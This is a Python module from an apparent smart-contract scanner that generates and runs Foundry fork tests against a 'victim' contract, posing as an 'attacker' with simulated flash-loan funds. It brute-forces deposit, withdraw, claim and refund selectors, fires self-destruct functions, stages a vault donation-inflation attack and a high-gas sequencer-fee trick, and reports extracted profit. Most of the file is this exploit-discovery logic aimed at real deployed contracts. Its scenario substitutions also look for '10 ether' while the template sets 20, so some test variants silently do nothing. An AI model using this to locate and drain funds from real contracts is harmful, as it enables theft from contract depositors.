import os
import subprocess
import logging
import time
import asyncio
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, Optional, List
from web3 import Web3
from scanner.config import RPCS

logger = logging.getLogger(__name__)

HONEYPOT_TEST_TEMPLATE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function asset() external view returns (address);
}

// Minimal Router interface for Swaps
interface IRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract HoneypotTestToken is Test {
    address victim = <VICTIM_ADDRESS>;
    address token = <TOKEN_ADDRESS>;
    address weth = <WETH_ADDRESS>; 
    address router = <ROUTER_ADDRESS>;
    address attacker = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("<RPC_URL>");
        vm.label(victim, "Victim");
        vm.label(token, "Token");
        vm.label(attacker, "Attacker");
    }

    function testSafeCycleToken() public {
        vm.startPrank(attacker);
        
        console.log("Contract ETH Balance:", address(victim).balance);

        <SEQUENCER_FEE_LOGIC>

        // 1. Flash Loan Simulation (20 ETH equivalent capital)
        uint256 startEth = 20 ether;
        vm.deal(attacker, startEth); 
        console.log("Flash Loan Mode: 20 ETH simulated");
        
        uint256 ethBalBefore = attacker.balance;

        // 2. Swap ETH -> Token
        // We assume WETH/Token pool exists. 
        // If not, this might fail, but that's a good filter.
        // We'll try 0.3% fee tier (3000) common for V3.
        
        uint256 tokenAmount = 0;
        if (token != weth) {
            // Approve router to spend WETH if we were wrapping, but here we send ETH value
            // Actually V3 router 'exactInputSingle' with value expects WETH if tokenIn is WETH?
            // Usually we wrap first or use multicall. 
            // For simplicity in simulation: DEAL tokens directly to simulate the "Swap Success" state,
            // then subtract the ETH cost from profit calculation to simulate the swap cost.
            // OR try to actually swap. 
            // Let's try to actually swap to prove liquidity exists!
            
            // Wrap ETH
            (bool s, ) = weth.call{value: startEth}("");
            require(s, "Wrap failed");
            IERC20(weth).approve(router, startEth);
            
            try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                tokenIn: weth,
                tokenOut: token,
                fee: 3000,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: startEth,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })) returns (uint256 amountOut) {
                tokenAmount = amountOut;
                console.log("[SIM] Success using WETH swap. Got tokens:", tokenAmount);
            } catch {
                // Try 500 fee tier
                try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                    tokenIn: weth,
                    tokenOut: token,
                    fee: 500,
                    recipient: attacker,
                    deadline: block.timestamp,
                    amountIn: startEth,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })) returns (uint256 amountOut) {
                    tokenAmount = amountOut;
                    console.log("[SIM] Success using WETH swap (fee 500). Got tokens:", tokenAmount);
                } catch {
                     // Try 10000 fee tier
                    try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                        tokenIn: weth,
                        tokenOut: token,
                        fee: 10000,
                        recipient: attacker,
                        deadline: block.timestamp,
                        amountIn: startEth,
                        amountOutMinimum: 0,
                        sqrtPriceLimitX96: 0
                    })) returns (uint256 amountOut) {
                        tokenAmount = amountOut;
                        console.log("[SIM] Success using WETH swap (fee 10000). Got tokens:", tokenAmount);
                    } catch {
                        console.log("[FAIL: No liquidity]");
                        revert("Swap ETH->Token failed");
                    }
                }
            }
        } else {
            // Token IS WETH
            (bool s, ) = weth.call{value: startEth}("");
            require(s, "Wrap failed");
            tokenAmount = startEth;
        }

        // 3. Approve & Deposit
        <ROUNDING_LOGIC>

        IERC20(token).approve(victim, tokenAmount);
        
        bool success;
        
        // Try multiple deposit selectors
        // deposit(uint256)
        (success, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("deposit(uint256,address)", tokenAmount, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("stake(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("contribute(uint256)", tokenAmount));
        // Try Brute-force/ABI Sniffing
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("claim(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("refund()"));
        // Fallback: Raw call with 1 wei
        if (!success) (success, ) = victim.call{value: 1 wei}("");

        <SELF_DESTRUCT_LOGIC>
        
        require(success, "Deposit failed (tried all variants)");
        <TIMESTAMP_WARP_LOGIC>

        // 4. Withdraw
        // Try multiple withdraw selectors
        (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256,address,address)", tokenAmount, attacker, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", tokenAmount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", tokenAmount));
        
        require(success, "Withdraw failed");

        // 5. Swap Token -> ETH
        uint256 tokenBal = IERC20(token).balanceOf(attacker);
        require(tokenBal > 0, "No tokens returned");
        
        if (token != weth) {
             IERC20(token).approve(router, tokenBal);
             // Swap back
             // Use 0.1% slippage calculation for stricter profit checking
             uint256 minOut = (tokenBal * 999) / 1000; // rough estimation if prices 1:1, but exactInputSingle needs amountOutMinimum in terms of tokenOut (ETH).
             // Since we don't know the price in simulation easily without oracle, we used 0.
             // But user requested "Simulate slippage in 0.1%".
             // If we set amountOutMinimum > 0, the swap will fail if not met.
             // If there is a price bug, we might get MORE than expected.
             // Let's try to set a high amountOutMinimum? No, that would revert.
             // Maybe the user means: Use a specific fee tier or path that implies 0.1%?
             // Or simply: Calculate amountOutMinimum based on PREVIOUS swap rate?
             // We swapped startEth -> tokenAmount. Rate = tokenAmount / startEth.
             // Expected return = tokenBal * (startEth / tokenAmount).
             // Slippage 0.1% = Expected * 0.999.
             
             uint256 expectedEth = 0;
             if (tokenAmount > 0) {
                 expectedEth = (tokenBal * startEth) / tokenAmount;
             }
             uint256 minOutEth = (expectedEth * 999) / 1000;

             try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                tokenIn: token,
                tokenOut: weth,
                fee: 3000, // Try 3000 first
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: tokenBal,
                amountOutMinimum: minOutEth,
                sqrtPriceLimitX96: 0
            })) returns (uint256 amountOut) {
                // Unwrap WETH
                 IERC20(weth).transfer(address(0), 0); // dummy
                 // Actually need to unwrap weth
                 // WETH withdraw is withdraw(uint)
                 (bool s, ) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amountOut));
                 require(s, "Unwrap failed");
            } catch {
                // Try 500
                 try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                    tokenIn: token,
                    tokenOut: weth,
                    fee: 500,
                    recipient: attacker,
                    deadline: block.timestamp,
                    amountIn: tokenBal,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })) returns (uint256 amountOut) {
                    (bool s, ) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amountOut));
                    require(s, "Unwrap failed");
                } catch {
                    // Try 10000
                     try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                        tokenIn: token,
                        tokenOut: weth,
                        fee: 10000,
                        recipient: attacker,
                        deadline: block.timestamp,
                        amountIn: tokenBal,
                        amountOutMinimum: 0,
                        sqrtPriceLimitX96: 0
                    })) returns (uint256 amountOut) {
                        (bool s, ) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amountOut));
                        require(s, "Unwrap failed");
                    } catch {
                         revert("Swap Token->ETH failed");
                    }
                }
            }
        } else {
            // Token is WETH, just unwrap
            (bool s, ) = weth.call(abi.encodeWithSignature("withdraw(uint256)", tokenBal));
            require(s, "Unwrap failed");
        }

        uint256 ethBalAfter = attacker.balance;
        int256 profit = int256(ethBalAfter) - int256(ethBalBefore);
        
        if (profit > 0) {
            console.log("PROFIT_WEI:", uint256(profit));
            console.log("[SIM] Profit found:", uint256(profit), "wei");
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
        
        // We consider it "Safe" if we got here (swapped in, deposited, withdrawn, swapped out)
        console.log("SUCCESS_METHOD:", "FLASH_LOAN_V2_SUCCESS");
        vm.stopPrank();
    }
}
"""

HONEYPOT_TEST_ETH_TEMPLATE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract HoneypotTestETH is Test {
    address victim = <VICTIM_ADDRESS>;
    address attacker = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("<RPC_URL>");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    function testSafeCycleETH() public {
        vm.startPrank(attacker);
        
        console.log("Contract ETH Balance:", address(victim).balance);

        <SEQUENCER_FEE_LOGIC>
        
        uint256 amount = 20 ether; // Flash Loan Amount
        vm.deal(attacker, amount); 
        console.log("Flash Loan Mode: 20 ETH simulated");
        
        uint256 balBefore = attacker.balance;

        // 1. Deposit
        bool success;
        
        // Try deposit() first
        (success, ) = victim.call{value: amount}(abi.encodeWithSignature("deposit()"));
        
        // Flexible entry: Try alternative selectors if standard deposit fails
        if (!success) (success, ) = victim.call{value: amount}("");
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
        // Try Brute-force/ABI Sniffing
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("refund()"));
        // Fallback: Raw call with 1 wei
        if (!success) (success, ) = victim.call{value: 1 wei}("");

        <SELF_DESTRUCT_LOGIC>
        
        require(success, "Deposit failed (tried all variants)");
        <TIMESTAMP_WARP_LOGIC>
        
        // 2. Withdraw
        // Priority: withdraw(uint256) -> withdraw() -> withdrawAll() -> redeem(uint256)
        
        // Try withdraw(uint256)
        (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        if (success) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
        
        // Try withdraw() - no args
        (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (success) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }

        // Try withdrawAll()
        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (success) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }

        // Try redeem(uint256) - ERC4626 standard
        (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256,address,address)", amount, attacker, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
        if (success) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }

        // Try leave() / exit()
        (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
        if (success) { _checkProfit(balBefore, "exit/leave"); vm.stopPrank(); return; }

        require(success, "Withdraw failed (tried all variants)");
        
        vm.stopPrank();
    }

    function _checkProfit(uint256 balBefore, string memory method) internal view {
        uint256 balAfter = attacker.balance;
        int256 profit = int256(balAfter) - int256(balBefore);
        console.log("SUCCESS_METHOD:", method);
        if (profit > 0) {
            console.log("PROFIT_WEI:", uint256(profit));
            console.log("[SIM] Profit found:", uint256(profit), "wei");
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
    }
}
"""

def _detect_self_destruct_selectors(w3: Web3, address: str) -> List[str]:
    """
    Detect if contract has SELFDESTRUCT opcode and return candidate selectors.
    """
    try:
        code = w3.eth.get_code(Web3.to_checksum_address(address))
        if not code or b'\xff' not in code:
            return []
        
        # If SELFDESTRUCT is present, try common selectors
        # kill(), destroy(), close(), die(), shutdown()
        return [
            "0x41c0e1b5", # kill()
            "0x83197ef0", # destroy()
            "0xcbf0b0c0", # suicide()
            "0x43d726d6", # close()
            "0x35f46994", # die()
            "0x0c55699c"  # shutdown()
        ]
    except Exception:
        return []

def _get_self_destruct_logic(selectors: List[str]) -> str:
    if not selectors:
        return ""
    
    logic = """
        // Try Self-Destruct triggers (Opcode 0xff detected)
        bool sdSuccess;
        // Capture code before potential self-destruct
        bytes memory originalCode = address(victim).code;
    """
    for sel in selectors:
        logic += f"""
        (sdSuccess, ) = victim.call(abi.encodeWithSelector(bytes4({sel})));
        if (sdSuccess) {{
            console.log("Self-destruct triggered with selector {sel}");
            if (address(victim).code.length == 0) {{
                console.log("Contract code destroyed. Reincarnating via vm.etch...");
                vm.etch(victim, originalCode);
            }}
        }}
        """
    return logic

def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
    if bug_type != "sequencer_fee":
        return ""
    
    return """
        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
        // Ensure tx.origin is attacker for refund checks
        vm.stopPrank();
        vm.startPrank(attacker, attacker);

        vm.deal(attacker, 20 ether);
        uint256 sfBalBefore = attacker.balance;
        
        // 1. Aggressive Gas Price Simulation (BaseFee * 100)
        vm.txGasPrice(block.basefee * 100); 
        
        bool sfSuccess;
        // Attempt standard execute
        (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
        
        bool profitFound = false;
        if (sfSuccess) {
             if (attacker.balance > sfBalBefore) {
                 profitFound = true;
                 console.log("PROFIT_WEI:", attacker.balance - sfBalBefore);
                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
             }
        }

        // 2. Fallback probing if no profit found (or failed)
        // Try sending 1 wei to contract address (no data)
        if (!profitFound) {
             // Reset balance for clean check (optional, but let's just check relative gain)
             uint256 balCheck = attacker.balance;
             (sfSuccess, ) = victim.call{value: 1 wei}("");
             if (sfSuccess) {
                 if (attacker.balance > balCheck) {
                     profitFound = true;
                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
                 }
             }
        }
        
        if (profitFound) {
             vm.stopPrank();
             return;
        }

        uint256 sfBalAfterFinal = attacker.balance;
        if (sfBalAfterFinal > sfBalBefore) {
            console.log("PROFIT_WEI:", sfBalAfterFinal - sfBalBefore);
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
        console.log("SUCCESS_METHOD: sequencer_fee_no_profit");
        vm.stopPrank();
        return;
    """

def _get_rounding_inflation_logic(bug_type: Optional[str]) -> str:
    if bug_type != "vault_rounding_dust":
        return ""

    return """
        uint256 tinyAmount = 1;
        IERC20(token).approve(victim, tinyAmount);
        (bool r1, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", tinyAmount));
        if (!r1) (r1, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tinyAmount));

        if (r1) {
            uint256 vaultBalBefore = IERC20(token).balanceOf(victim);
            uint256 donation = 10 ether;
            uint256 newVaultBal = vaultBalBefore + donation;
            deal(token, victim, newVaultBal);
            
            uint256 attackerBefore = IERC20(token).balanceOf(attacker);

            IERC20(token).approve(victim, tinyAmount);
            (bool r2, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", tinyAmount));
            if (!r2) (r2, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tinyAmount));
            
            if (r2) {
                (bool r3, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", tinyAmount));
                if (!r3) (r3, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", tinyAmount));
                
                uint256 attackerAfter = IERC20(token).balanceOf(attacker);
                console.log("[SIM] Inflation: Next deposit+withdraw after donation. Balance delta:", attackerAfter - attackerBefore);
            }
        }
    """


def _get_timestamp_warp_logic(bug_type: Optional[str]) -> str:
    if bug_type != "timestamp_dependence":
        return ""
    return """
        vm.warp(block.timestamp + 86401);
        vm.roll(block.number + 100);
    """


def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
    content = HONEYPOT_TEST_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
    content = content.replace("<TOKEN_ADDRESS>", token_address)
    content = content.replace("<RPC_URL>", rpc_url)
    content = content.replace("<WETH_ADDRESS>", weth_address)
    content = content.replace("<ROUTER_ADDRESS>", router_address)
    
    sd_logic = _get_self_destruct_logic(self_destruct_selectors)
    content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)

    sf_logic = _get_sequencer_fee_logic(bug_type)
    content = content.replace("<SEQUENCER_FEE_LOGIC>", sf_logic)

    ri_logic = _get_rounding_inflation_logic(bug_type)
    content = content.replace("<ROUNDING_LOGIC>", ri_logic)
    tw_logic = _get_timestamp_warp_logic(bug_type)
    content = content.replace("<TIMESTAMP_WARP_LOGIC>", tw_logic)
    
    return content

def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
    content = HONEYPOT_TEST_ETH_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
    content = content.replace("<RPC_URL>", rpc_url)
    
    sd_logic = _get_self_destruct_logic(self_destruct_selectors)
    content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)

    sf_logic = _get_sequencer_fee_logic(bug_type)
    content = content.replace("<SEQUENCER_FEE_LOGIC>", sf_logic)
    tw_logic = _get_timestamp_warp_logic(bug_type)
    content = content.replace("<TIMESTAMP_WARP_LOGIC>", tw_logic)
    
    return content

def run_honeypot_simulation_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
    """
    Run a forge test to simulate the ETH -> Swap -> Deposit -> Withdraw -> Swap -> ETH cycle.
    """
    sd_selectors = []
    if bug_type == "self_destruct" and w3:
        target = implementation_address if implementation_address else victim_address
        sd_selectors = _detect_self_destruct_selectors(w3, target)
        if sd_selectors:
            logger.info(f"Injecting Self-Destruct selectors for {target}")

    endpoints: List[str] = []
    if rpc_url:
        endpoints.append(rpc_url)
    for e in RPCS:
        if e not in endpoints:
            endpoints.append(e)

    last_result: Dict[str, Any] = {}

    for endpoint in endpoints:
        base_content = generate_honeypot_test_token(victim_address, token_address, endpoint, weth_address, router_address, sd_selectors, bug_type)
        scenarios: List[Dict[str, Any]] = []

        if bug_type == "vault_rounding_dust":
            scenarios.append({
                "label": "10_eth",
                "content": base_content
            })
            scenarios.append({
                "label": "1_wei",
                "content": base_content.replace("uint256 startEth = 10 ether;", "uint256 startEth = 1 wei;")
            })
            scenarios.append({
                "label": "100_eth",
                "content": base_content.replace("uint256 startEth = 10 ether;", "uint256 startEth = 100 ether;")
            })
        else:
            scenarios.append({
                "label": "default",
                "content": base_content
            })

        best_result: Dict[str, Any] = {}
        zero_profit_safe = False

        for scenario in scenarios:
            time.sleep(0.1)
            test_content = scenario["content"]
            result = _run_forge_test(victim_address, test_content, unique_id=scenario["label"])
            last_result = result
            if not best_result or result.get("simulated_profit", 0) > best_result.get("simulated_profit", 0):
                best_result = result

            combined = f"{result.get('error') or ''}\n{result.get('output') or ''}"
            if "429" in combined or "Too Many Requests" in combined:
                logger.warning(f"RPC 429 detected during token simulation on {endpoint}, backing off for 0.5 seconds")
                time.sleep(0.5)
                break

            if bug_type == "vault_rounding_dust":
                profit = result.get("simulated_profit", 0)
                if scenario["label"] == "10_eth" and result.get("safe") and profit == 0:
                    zero_profit_safe = True
                logger.info(f"[ROUNDING_SIM] Scenario {scenario['label']} profit: {profit}")

            if result.get("simulated_profit", 0) > 0:
                return result

        if bug_type == "vault_rounding_dust" and zero_profit_safe:
            logger.info("[INFO] Vault secure against simple 10 ETH inflation")
            try:
                print("[INFO] Vault secure against simple 10 ETH inflation", flush=True)
            except Exception:
                pass

        if best_result:
            return best_result

    if bug_type == "vault_rounding_dust" and last_result.get("safe") and last_result.get("simulated_profit", 0) == 0:
        logger.info("[INFO] Vault secure against simple 10 ETH inflation")
        try:
            print("[INFO] Vault secure against simple 10 ETH inflation", flush=True)
        except Exception:
            pass
    return last_result

def run_honeypot_simulation_eth(victim_address: str, rpc_url: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
    """
    Run a forge test to simulate Deposit->Withdraw cycle (ETH).
    """
    sd_selectors = []
    if bug_type == "self_destruct" and w3:
        target = implementation_address if implementation_address else victim_address
        sd_selectors = _detect_self_destruct_selectors(w3, target)
        if sd_selectors:
            logger.info(f"Injecting Self-Destruct selectors for {target}")

    endpoints: List[str] = []
    if rpc_url:
        endpoints.append(rpc_url)
    for e in RPCS:
        if e not in endpoints:
            endpoints.append(e)

    best_result_overall: Dict[str, Any] = {}
    last_result: Dict[str, Any] = {} # Initialize last_result

    for endpoint in endpoints:
        base_content = generate_honeypot_test_eth(victim_address, endpoint, sd_selectors, bug_type)
        scenarios: List[Dict[str, Any]] = []

        scenarios.append({
            "label": "20_eth",
            "amount_wei": 20 * 10**18,
            "content": base_content
        })
        scenarios.append({
            "label": "5_eth",
            "amount_wei": 5 * 10**18,
            "content": base_content.replace("uint256 amount = 20 ether;", "uint256 amount = 5 ether;")
        })
        scenarios.append({
            "label": "1_eth",
            "amount_wei": 1 * 10**18,
            "content": base_content.replace("uint256 amount = 20 ether;", "uint256 amount = 1 ether;")
        })
        scenarios.append({
            "label": "1_wei",
            "amount_wei": 1,
            "content": base_content.replace("uint256 amount = 20 ether;", "uint256 amount = 1 wei;")
        })

        current_best: Dict[str, Any] = {}

        async def _run_one(sc, delay: float):
            await asyncio.sleep(delay)
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(None, _run_forge_test, victim_address, sc["content"], sc["label"])

        async def _run_batch():
            tasks = []
            for idx, sc in enumerate(scenarios):
                tasks.append(_run_one(sc, idx * 0.1))
            return await asyncio.gather(*tasks)

        results = []
        try:
            # Use a new event loop for this thread
            results = asyncio.run(_run_batch())
        except Exception as e:
            logger.error(f"Parallel simulation failed: {e}")
        
        for i, result in enumerate(results):
            scenario = scenarios[i]
            value = abs(int(scenario["amount_wei"]))
            print(f"!!! SIMULATION DEBUG: value={value}", flush=True)
            
            result["loan_amount_wei"] = value
            last_result = result

            combined = f"{result.get('error') or ''}\n{result.get('output') or ''}"
            if "429" in combined or "Too Many Requests" in combined:
                logger.warning(f"RPC 429 detected during ETH simulation on {endpoint}, backing off for 0.5 seconds")
                time.sleep(0.5)
                break

            if result.get("safe") and result.get("simulated_profit", 0) > 0:
                return result

            if not current_best or result.get("simulated_profit", 0) > current_best.get("simulated_profit", 0):
                current_best = result

        if current_best.get("simulated_profit", 0) > best_result_overall.get("simulated_profit", 0):
            best_result_overall = current_best
            
        # Continue to next endpoint if no success returned

    return best_result_overall if best_result_overall else last_result

def _run_forge_test(victim_address: str, test_content: str, unique_id: str = "") -> Dict[str, Any]:
    # Save to temporary file
    suffix = f"_{unique_id}" if unique_id else ""
    test_file = f"test/Honeypot_{victim_address[:8]}{suffix}.t.sol"
    
    # Ensure test dir exists
    if not os.path.exists("test"):
        os.makedirs("test")
        
    with open(test_file, "w") as f:
        f.write(test_content)
        
    try:
        cmd = f"forge test --match-path {test_file} --remappings forge-std/=lib/forge-std/src/ -vvvv"
        
        # On Windows, shell=True is often required for 'forge' command to be found if it's not in the immediate path or requires env vars
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        
        # Check if output is empty (which happens if forge is not found or fails silently)
        if not result.stdout and not result.stderr:
             return {"safe": False, "error": "Forge command returned empty output. Is Foundry installed and in PATH?"}

        is_safe = "PASS" in result.stdout
        
        # Extract success method if present
        success_method = None
        profit_wei = 0
        
        if is_safe:
            import re
            method_match = re.search(r"SUCCESS_METHOD: (.*)", result.stdout)
            if method_match:
                success_method = method_match.group(1).strip()
            
            profit_match = re.search(r"PROFIT_WEI: (.*)", result.stdout)
            if profit_match:
                try:
                    p_str = profit_match.group(1).strip()
                    if p_str.startswith("-"):
                        # remove extra space if present, e.g. "- 123"
                        p_str = p_str.replace(" ", "")
                    profit_wei = int(p_str)
                except:
                    pass

        error_msg = result.stderr
        if not is_safe and result.stdout:
            # Try to extract a clean failure reason from stdout
            # Look for lines like: [FAIL: Deposit failed] or [FAIL. Reason: ...]
            import re
            # Regex to capture [FAIL: reason]
            fail_match = re.search(r"\[FAIL: (.*?)\]", result.stdout)
            if fail_match:
                error_msg = f"Simulation Reverted: {fail_match.group(1)}"
            else:
                # If no specific fail message, but we have stdout, return relevant lines (avoiding compiler logs)
                # Filter out "Compiling...", "Solc...", "Compiler run successful"
                lines = [line for line in result.stdout.splitlines() if not line.startswith(("[", "Solc", "Compiler", "Ran 1 test", "Suite result"))]
                error_msg = "\n".join(lines).strip()
                if not error_msg:
                    error_msg = result.stdout # Fallback to full output if filtering leaves nothing
        elif not is_safe and not error_msg:
             error_msg = "Unknown error (Simulation failed but no stderr/stdout reason found)"

        return {
            "safe": is_safe,
            "output": result.stdout,
            "error": error_msg,
            "method": success_method,
            "simulated_profit": profit_wei
        }
    except Exception as e:
        logger.error(f"Simulation failed: {e}")
        return {"safe": False, "error": str(e)}
    finally:
        # Cleanup
        if os.path.exists(test_file):
            try:
                os.remove(test_file)
            except:
                pass
